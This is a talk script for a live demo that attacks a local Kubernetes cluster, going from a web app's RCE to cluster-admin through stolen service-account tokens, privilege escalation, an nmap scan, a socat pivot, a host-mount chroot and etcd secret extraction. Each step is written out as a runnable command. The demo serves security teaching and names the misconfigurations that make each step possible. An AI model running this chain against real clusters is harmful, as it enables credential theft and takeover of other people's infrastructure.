# DEMO FLOW

### STAGE 1 - COMPROMISE A POD

SLIDE 3
Our starting point is that we've found a vulnerable web application on the internet with an RCE vulnerability. 

At this point all we know is that we have an app that is exposed on port 80, which we have connected to. 

SLIDE 4

Let's also introduce the Timeline of Doom, which will track how our exploit scope has changed over time. 

What can we do from here ? 

So the first thing we might be interested in is looking at the environment variables. Typically containers are configured with environment variables so this might tell us some interesting things.

[ENV](http://localhost/webadmin?cmd=env)

This has told us lots of interesting information. We can see we are running in a Kubernetes cluster, so we are in a container, and we can see the internal address of the API server. From this we can also assume the pod running our application is exposing the port via a Kubernetes service. 

SLIDE 5 - Pod, in Kubernetes cluster, with internal API

Let's also see what we can find out about the network at this point 

[IP](http://localhost/webadmin?cmd=ip%20a)

So now we know what IP range our container is in. 

SLIDE 6 - Add pod IP

Let's see what else we can do. By default each pod in Kubernetes has a service token automounted in it, which is associated with the service account which was used to create the pod. You can control this on the service account or pod level using :

`automountServiceAccountToken: false`

[TOKEN](http://localhost/webadmin?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)

It seems our permissions will let us access that, so let's take a look at our Timeline of Doom now. 

SLIDE 7

It's also worth noting that these first two stages are also possible just with a directory traversal vulnerability since we can do :

[ENV_DIR](http://localhost/webadmin?cmd=cat%20/proc/self/environ)

Let's see what we can get from the internal API server using the token we just found. We're going to try to connect from the app to the internal address of the API server.

SLIDE 8

[API](http://localhost/webadmin?cmd=curl%20--cacert%20/var/run/secrets/kubernetes.io/serviceaccount/ca.crt%20-H%20"Authorization:%20Bearer%20$(cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)"%20https://10.96.0.1/api/v1/namespaces/default/endpoints)

What we've done in this string is to curl the internal endpoint of the API server asking for the cluster endpoints, and passed it both the service account certificate and the token. 

This command succeeds, and in a real environment would give us the external address for the Kubernetes API server. Because we are running in Kind, it won't be this IP address, it will just be exposed on localhost with the same port. This is a vulnerability, and has been created by a too permissive policy for the service token. 

SLIDE 9 - Updated timelime

Now we have a token we can configure kubectl to use that token against the external endpoint of the API server. 

SLIDE 10 - connect to external API

Run the helper script and configure kubectl locally in a new shell to use the token we just got. 

`k get pods`

This will fail saying we don't have permissions in the default namespace, but it does give us the namespace of the service account, so let's try in that namespace.

`k get pods -n secure`

Now we can see we have some permissions in that namespace. Let's investigate a bit more what permissions we do have - and there's a variety of ways we can do that :

`k auth can-i --list --token=$TOKEN`

We don't have much in the default namespace, although we can see the permission to list endpoints. 

```console
Resources                                       Non-Resource URLs   Resource Names   Verbs
endpoints                                       []                  []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
podsecuritypolicies.policy                      []                  [privileged]     [use]
podsecuritypolicies.policy                      []                  [restricted]     [use]
```

Now run the same command against the secure namespace :

`k auth can-i --list --token=$TOKEN -n secure`

```console
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [create get watch list patch delete deletecollection update]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
podsecuritypolicies.policy                      []                  [restricted]     [use]
```

Here we can see we've got a lot more permissions. We can also show the output of the access matrix plugin, which is a kubectl plugin installed through krew :

`kubectl access-matrix`

`kubectl access-matrix -n secure`

So now we know we can do quite a few things in the secure namespace, and not a lot in default. This is a fairly common pattern, to give service accounts permissions in their own namespace.

SLIDE 11 - Add namespaces

SLIDE 12 - show typical role and binding

SLIDE 13 - updated timeline to include role

Let's try and get a shell on the compromised pod :

`kubectl get pods -n secure`

`kubectl exec -it $POD -n secure -- /bin/bash`

Check what user we are :

```console
whoami
```
We aren't root, do we have sudo ? 

Test if we can create files

`touch test`

If we can do this, it potentially means we can download software or change configuration. I already know we have curl, so that's definitely possible. This is a vulnerability, caused by not setting `readonlyRootFilesystem=true`

SLIDE 14 - readonly root

Exit out of the container for the minute. 

### STAGE 2 - EXTEND OUR PRIVILEGES

So we know we have permissions in this secure namespace, so let's try and spawn a root pod.

`kubectl apply -f demo_yamls/root_pod.yaml -n secure`

Now this looks like something happened, but let's take a closer look :

```console
% k get pods -n secure
NAME                        READY   STATUS                       RESTARTS   AGE
root-pod                     0/1     CreateContainerConfigError   0          42s
webadmin-57f55c596d-xjdbc   1/1     Running                      0          8m38s
```

We can see we get an Error here. 

```console
% kubectl describe pod root-pod -n secure
...
  Warning  Failed     10s (x6 over 67s)  kubelet            Error: container has runAsNonRoot and image will run as root
...
```

So we know that something is blocking us deploying a container running as root, likely Pod Security Policy. Let's try and launch a privileged pod running as non-root :

`kubectl apply -f demo_yamls/nonroot_priv.yaml -n secure`

```console
% kubectl apply -f demo_yamls/nonroot_priv.yaml -n secure
Error from server (Forbidden): error when creating "demo_yamls/nonroot_priv.yaml": pods "snyky-priv" is forbidden: PodSecurityPolicy: unable to admit pod: [spec.containers[0].securityContext.privileged: Invalid value: true: Privileged containers are not allowed]
```

Here we can see we've definitely got a PSP that's restricting us in that namespace.

SLIDE 15 - Pod Security Policy

So does that stop us from extending our exploit ? Let's try something else :

`kubectl apply -f demo_yamls/nonroot_nonpriv.yaml -n secure`

This one deploys, and so we also know that this cluster doesn't restrict me being able to launch images from external repositories. Here's another vulnerability.

This image doesn't run as root and we didn't ask for privileged. But ...

`kubectl port-forward snyky 8080 -n secure`

[GOTTY](http://localhost:8080)

```console
snyky@snyky:/root$ whoami                                                                                                                                                                            
snyky
snyky@snyky:/root$ sudo su
root@snyky:~# 
```

The problem here is that the PSP doesn't include :

`allowPrivilegeEscalation=false`

SLIDE 16 - show PSP with correct privilege escalation setting

SLIDE 17 - add PSP to timeline

Lots of places on the internet say this doesn't matter if you disallow privileged and root, but this isn't true. I now have a lot more things I can do in my container. I can install software AND I can poke around in the network. 

```console
root@snyky:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.244.1.13  netmask 255.255.255.0  broadcast 10.244.1.255
        inet6 fe80::1014:90ff:fec5:7895  prefixlen 64  scopeid 0x20<link>
        ether 12:14:90:c5:78:95  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13  bytes 978 (978.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 275  bytes 544618 (544.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 275  bytes 544618 (544.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Try to use nmap as the snyky user, it will fail since nmap needs privileges to run. Now run it as root

```console
root@snyky:~# nmap -sS -p 5000 -PN -n --open 10.244.1.13/24
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-03 17:53 UTC
Nmap scan report for 10.244.1.9
Host is up (0.000059s latency).

PORT     STATE SERVICE
5000/tcp open  upnp

Nmap scan report for 10.244.1.11
Host is up (0.000062s latency).

PORT     STATE SERVICE
5000/tcp open  upnp

Nmap done: 256 IP addresses (254 hosts up) scanned in 2.60 seconds
```

We've now discovered another service running, which also has port 5000 open. 

SLIDE 18 - still don't know which namespace this new application is in

SLIDE 19 - no network controls to timeline

### STAGE 3 - ESCAPE THE NAMESPACE AND THE PSP

```console
root@snyky:~# socat tcp-listen:5001,reuseaddr,fork tcp:10.244.1.9:5000 &
```

SLIDE 20 - connect via snyky pod to new pod

As we already saw this works because there isn't a network policy stopping us from traversing between the secure namespace and other namespaces in the cluster. 

Back to our local console :

`kubectl port-forward snyky 5001 -n secure`

[WEBADMIN_DEFAULT](http://localhost:5001)

Looks like we have another instance of the same vulnerable application. Let's get the token for this one

[NEW_TOKEN](http://localhost:5001?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)

Now we can switch over the token in our kubeconfig and see what we can do with this token. 

`kubectl get pods`

With this token we can now view the default namespace, so we've managed to escape the secure namespace.

`k auth can-i --list --token=$TOKEN`

We can also see that we have permissions in the default namespace

SLIDE 21 - Add new app running in default

### STAGE 4 - GAIN CONTROL OF THE NODE

Let's try and create a privileged pod here. Show the pod yaml to show the host mount. 

`kubectl apply -f demo_yamls/nonroot_priv.yaml`

This now works, since this namespace isn't restricted by the Pod Security Policy. With a privileged pod, we can now do a lot more - we've now not only launched a privileged pod, but also a host mount volume. 

Get a shell on the container, either using kubectl or by accessing gotty again, and show the process table inside the container.

```console
sudo su
ps ax
```

Now let's mount the host filesystem in a chroot. Show the process table again - it's now clearly the host. 

```console
chroot /chroot
ps ax
```

SLIDE 22 - show host node

### STAGE 5 - GAIN CONTROL OVER THE CLUSTER

As we now have the host filesystem on the node we have access to the kubelet token, which has much wider permissions than the service account tokens we've been using up until this point.

```console
export KUBECONFIG=/etc/kubernetes/kubelet.conf
kubectl get pods -n kube-system
kubectl get nodes
```

SLIDE 24 kube-system namespace

Note that none of our other tokens let us do this, this is the kube-system namespace where the control plane for the entire cluster is running. We can also see the nodes, which is very useful to us, and we can find out where all of our kube-system pods are running. 

`kubectl describe pod etcd-kind-control-plane -n kube-system`

Note where the etcd cluster is running

However ...

```console
kubectl run -i --tty busybox --image=busybox --restart=Never -- sh
Error from server (Forbidden): pods "busybox" is forbidden: pod does not have "kubernetes.io/config.mirror" annotation, node "kind-worker" can only create mirror pods
```

This command fails because the kubelet token still doesn't have all the permissions needed to start containers in the kube-system namespace. The mirror pods line is interesting here, since it would allow us to launch any pod we want directly in kube-system by putting a YAML file into `/etc/kubernetes/manifests` on the node. This would then give us many attack vectors against the other control plane pods in the kube-system namespace

However, because we've escaped the Pod Security Policy and we now know which nodes we have, we can actually attack on a different vector at this point. We're going to launch a pod to the node hosting etcd, and in the Pod configuration we're going to mount the host filesystem to give us the credentials to connect to etcd. 

Show the YAML for the etcdclient pod. Note the specified node, and the credential mounting. 

`kubectl apply -f demo_yamls/etcdclient.yaml`

Now we can run etcdclient and check if we have a connection to etcd

`kubectl exec etcdclient -- /usr/local/bin/etcdctl member list`

SLIDE 25 Show etcdclient pod connecting to etcd

Etcd contains a lot of interesting information about the cluster, not least of which is secrets.

`kubectl exec etcdclient -- /usr/local/bin/etcdctl get '' --keys-only --from-key | grep secrets`

There is a role here which has cluster-admin rights by default, let's see if we can get that token :

`k exec etcdclient -- /usr/local/bin/etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jvl8m`

We have the token, what can it do ? 

`k auth can-i --list --token=$TOKEN`

I now have a cluster-admin token, and can do whatever I want with the cluster.

SLIDE 26 - End of our timeline of doom

SLIDE 27 - Game over

SLIDE 28 - how could we have prevented

SLIDE 29 - standing on the shoulders of giants













